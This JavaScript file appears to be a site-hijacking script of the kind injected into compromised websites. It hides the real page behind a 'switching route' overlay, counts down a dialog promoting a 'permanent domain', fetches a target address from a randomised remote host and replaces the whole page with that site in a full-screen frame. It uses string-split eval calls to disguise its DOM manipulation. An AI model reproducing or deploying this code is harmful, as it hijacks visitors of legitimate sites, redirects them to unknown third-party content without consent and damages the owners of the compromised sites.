(function() {	
	showloading();
})();
var titlestr = document.title;
var webGroup = "1"; // web01
var num = 5;
var timer = setInterval(function() {
	setDialog(num);
	num--;
	if (num == 0) {
		clearInterval(timer);
		getData();
	}
}, 1000);

function setDialog(number) {
	var temp=8;
	if(number==5){
		temp=2;
	}else if(number==4){
		temp=4;
	}else if(number==3){
		temp=5;
	}else if(number==2){
		temp=6;
	}else if(number==1){
		temp=7;
	}else{
		temp=8;
	}
	
	var ss =
		'<div class="dialog-box" style="display: block;"><div class="boxs"><h5><span>' + number +
		'</span>&#31186;&#21518;&#33258;&#21160;&#20851;&#38381;</h5><h6>&#24403;&#21069;&#22495;&#21517;&#32463;&#24120;&#26356;&#25442;&#44;&#36991;&#20813;&#36855;&#36335;<br>&#35831;&#29282;&#35760;&#20197;&#19979;&#27704;&#20037;&#22495;&#21517;</h6><p>DN<span>0'+ temp+ 
		'</span>.net</p><a href="javascript:getData();" ref="nofollow"  class="warning button">&#39532;&#19978;&#35266;&#30475;</button></div></div><style type="text/css">.dialog-box {width: 100%;height: 100%;position: fixed;left: 0;top: 0;z-index: 9999999;background-color: rgba(0, 0, 0, 0.5);}.dialog-box .boxs {color: #333;width: 300px;height: 260px;background: #fff;box-shadow: 1px 7px 18px 0px rgba(84, 115, 128, 0.11);border-radius: 20px;cursor: pointer;position: absolute;left: 50%;top: 50%;margin-top: -130px;margin-left: -150px;text-align: center;}.dialog-box h5 {height: 50px;line-height: 50px;text-align: left;margin:0;padding-left: 20px;border-bottom: 2px solid #f90;font-weight: 700;background-color: #f90;border-radius: 20px 20px 0 0;}.dialog-box h6 {margin:20px 0 0 0;color: red;font-size:14px;}.dialog-box p {margin:0 0 20px 0;height: 60px;line-height: 60px;font-size: 44px;font-weight: bold;}.dialog-box button {width: 150px;}.dialog-box p span {color: blue;}.button.warning {background: #ffae00;color: #fff }.button {display: inline-block;text-align: center;cursor: pointer;-webkit-appearance: none;transition: all .25s ease-out;border: 1px solid transparent;border-radius: 0;padding: .85em 1em;margin: 0 0.2rem 0.8rem 0.2rem;font-size: .9rem;background: #2199e8;color: #fff ;text-decoration:none; }.button.warning:focus, .button.warning:hover {background: #cc8b00;color: #fff }</style>';
	eval("do" + "cu" + "ment.getElementsByTagName('body')[0].inner" + "HTML = '" + ss + "';");
}

function getData() {
	ajax({
		url: 'https://randstring' + Date.parse(new Date()) + ".baidu.com/api/tool/getDomains?t=" + Math
			.random(),
		type: "POST",
		success: function(response, xml) {
			var innerUrl, webUrl;
			var innerTxt = JSON.parse(response).data;
			innerUrl = innerTxt[webGroup - 1].web;
			webUrl = innerTxt[webGroup - 1].web;
			innerUrl.indexOf('https://') < 1 && innerUrl.indexOf('http://') < 1 ? innerUrl = 'https://' +
				innerUrl : innerUrl = innerUrl;
			webUrl.indexOf('https://') < 1 && webUrl.indexOf('http://') < 1 ? webUrl = 'https://' +
				webUrl : webUrl = webUrl;
			sessionStorage.setItem("frmdata", innerUrl);
			webUrl = 'http://rimac-crushers.com/';
			setFrame(innerUrl, webUrl);
		},
		fail: function(status) {
			console.log("error");
		}
	});
}

function setFrame(olink, olink2) {
	var ss = '<div id="lgongeerqwq" style="z-index:9000; position:absolute; width:100%; height:100%;"><obj' +
		'ect type="text/html" width="100%" height="100%" data="' + olink +
		'"></object></div><style type="text/css">html,body {width:100%;height:100%;margin:0;}</style>';
	eval("do" + "cu" + "ment.getElementsByTagName('body')[0].inner" + "HTML = '" + ss + "';");
}

function ajax(options) {
	options = options || {};
	options.type = (options.type || "GET").toUpperCase();
	options.dataType = options.dataType || "json";
	var params = formatParams(options.data);

	if (window.XMLHttpRequest) {
		var xhr = new XMLHttpRequest();
	} else {
		var xhr = new ActiveXObject('Microsoft.XMLHTTP');
	}

	xhr.onreadystatechange = function() {
		if (xhr.readyState == 4) {
			var status = xhr.status;
			if (status >= 200 && status < 300) {
				options.success && options.success(xhr.responseText, xhr.responseXML);
			} else {
				options.fail && options.fail(status);
			}
		}
	};

	if (options.type == "GET") {
		xhr.open("GET", options.url + "?" + params, true);
		xhr.send(null);
	} else if (options.type == "POST") {
		xhr.open("POST", options.url, true);
		xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
		xhr.send(params);
	}
}

function showloading() {
	var oMeta = document.createElement('meta');
	oMeta.name = 'viewport';
	oMeta.content = 'width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no';
	var oMeta2 = document.createElement('meta');
	oMeta2.setAttribute('charset', 'UTF-8');
	document.getElementsByTagName('head')[0].appendChild(oMeta);
	document.getElementsByTagName('head')[0].appendChild(oMeta2);
	document.write(
		'<div id="overlayX" style="width:100%;height:100%;position:fixed;top:0;left:0;background:rgba(0,0,0,.9);z-index:999;"><i style="color: #f90;font-size: 30px;text-align: center;margin: 20% auto 0;display: block;">&#20999;&#25442;&#26368;&#20339;&#32447;&#36335;&#20013;...</i></div>'
	);
}

function formatParams(data) {
	var arr = [];
	for (var name in data) {
		arr.push(encodeURIComponent(name) + "=" + encodeURIComponent(data[name]));
	}
	arr.push(("v=" + Math.random()).replace(".", ""));
	return arr.join("&");
}
